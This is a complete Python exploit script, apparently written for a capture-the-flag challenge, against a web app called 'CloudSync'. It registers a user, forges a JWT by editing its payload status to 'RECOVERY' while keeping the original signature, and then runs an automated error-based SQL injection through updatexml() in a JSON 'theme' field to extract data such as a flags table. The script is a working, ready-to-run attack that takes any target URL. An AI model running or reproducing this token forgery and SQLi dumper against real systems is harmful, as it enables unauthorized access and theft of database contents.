#!/usr/bin/env python3
import argparse
import base64
import json
import random
import re
import string
import time
from typing import Any

import requests


def b64url_encode_bytes(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_encode_json(obj: dict) -> str:
    return b64url_encode_bytes(json.dumps(obj, separators=(",", ":")).encode())


def b64url_decode_json(data: str) -> dict:
    data += "=" * ((4 - len(data) % 4) % 4)
    return json.loads(base64.urlsafe_b64decode(data))


def new_session() -> requests.Session:
    session = requests.Session()
    session.trust_env = False
    return session


def random_username(prefix: str = "u") -> str:
    suffix = "".join(random.choice(string.hexdigits.lower()) for _ in range(8))
    return f"{prefix}{suffix}"


def http_request(
    session: requests.Session,
    method: str,
    url: str,
    *,
    retries: int = 5,
    retry_delay: float = 1.0,
    **kwargs: Any,
) -> requests.Response:
    last_error = None
    for attempt in range(1, retries + 1):
        try:
            return session.request(method, url, **kwargs)
        except requests.RequestException as exc:
            last_error = exc
            if attempt == retries:
                break
            time.sleep(retry_delay * attempt)
    raise RuntimeError(f"request failed after {retries} tries: {method} {url} -> {last_error}")


def forge_recovery_token(token: str) -> str:
    header_b64, payload_b64, signature_b64 = token.split(".")
    payload = b64url_decode_json(payload_b64)
    payload["status"] = "RECOVERY"
    payload["exp"] = int(time.time()) + 3600
    return f"{header_b64}.{b64url_encode_json(payload)}.{signature_b64}"


def build_error_sqli(expr: str, pos: int, chunk_size: int) -> str:
    return (
        "A' OR updatexml(1,concat(0x7e,substring(("
        f"{expr}"
        f"),{pos},{chunk_size}),0x7e),1)-- "
    )


def parse_xpath_error(body: str) -> str | None:
    match = re.search(r"XPATH syntax error: '~(.*?)~'", body)
    if match:
        return match.group(1)
    match = re.search(r"XPATH syntax error: '(.*?)'", body)
    if match:
        return match.group(1)
    return None


def register_user(session: requests.Session, base_url: str, username: str, password: str) -> None:
    response = http_request(
        session,
        "POST",
        f"{base_url}/register",
        data={"username": username, "password": password},
        timeout=10,
        allow_redirects=False,
    )
    if response.status_code not in (200, 302):
        raise RuntimeError(f"register failed: {response.status_code} {response.text[:200]}")


def login_user(session: requests.Session, base_url: str, username: str, password: str) -> str:
    response = http_request(
        session,
        "POST",
        f"{base_url}/login",
        data={"username": username, "password": password},
        timeout=10,
        allow_redirects=False,
    )
    token = session.cookies.get("token")
    if response.status_code not in (200, 302) or not token:
        raise RuntimeError(f"login failed: {response.status_code} {response.text[:200]}")
    return token


def leak_temp_creds(session: requests.Session, base_url: str) -> str:
    response = http_request(
        session,
        "POST",
        f"{base_url}/api/v1/user/sync",
        json={"theme": "'", "language": "zh"},
        timeout=10,
        allow_redirects=False,
    )
    return response.text


def dump_via_error_sqli(session: requests.Session, base_url: str, expr: str, chunk_size: int = 28) -> str:
    result = []
    for pos in range(1, 512, chunk_size):
        payload = build_error_sqli(expr, pos, chunk_size)
        response = http_request(
            session,
            "POST",
            f"{base_url}/api/v1/user/sync",
            json={"theme": payload, "language": "zh"},
            timeout=10,
            allow_redirects=False,
        )
        chunk = parse_xpath_error(response.text)
        if chunk is None:
            raise RuntimeError(f"unexpected response at pos {pos}: {response.text[:300]}")
        if chunk == "":
            break
        result.append(chunk)
        if len(chunk) < chunk_size:
            break
    return "".join(result)


def main() -> None:
    parser = argparse.ArgumentParser(description="CloudSync jwt_downgrade exploit")
    parser.add_argument("base_url", help="target base url, e.g. http://39.105.213.28:5001")
    parser.add_argument("--username", help="existing username; if omitted, auto-register one")
    parser.add_argument("--password", default="P@ssw0rd123", help="password for login/register")
    parser.add_argument(
        "--expr",
        default="SELECT flag FROM flags LIMIT 0,1",
        help="SQL expression to exfiltrate through updatexml()",
    )
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    username = args.username or random_username()
    password = args.password

    public_session = new_session()
    if args.username is None:
        register_user(public_session, base_url, username, password)
        print(f"[+] registered: {username}:{password}")

    token = login_user(public_session, base_url, username, password)
    print(f"[+] login ok, token payload: {b64url_decode_json(token.split('.')[1])}")

    recovery_token = forge_recovery_token(token)
    recovery_session = new_session()
    recovery_session.cookies.set("token", recovery_token)
    print("[+] forged recovery token by changing JWT payload status -> RECOVERY")

    temp_cred_error = leak_temp_creds(recovery_session, base_url)
    print(f"[+] recovery-mode quote probe: {temp_cred_error}")

    leaked = dump_via_error_sqli(recovery_session, base_url, args.expr)
    print(f"[+] leaked: {leaked}")


if __name__ == "__main__":
    main()
